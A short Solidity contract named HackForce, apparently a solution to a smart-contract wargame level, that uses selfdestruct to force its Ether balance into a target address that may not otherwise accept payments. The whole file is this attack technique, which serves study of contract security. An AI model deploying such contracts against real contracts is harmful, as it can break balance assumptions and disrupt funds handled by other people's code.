// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackForce {
  address payable forceAddress;

  constructor(address payable _forceAddress) public payable {
    forceAddress = _forceAddress;
  }

  function forceSend() public {
    selfdestruct(forceAddress);
  }
}
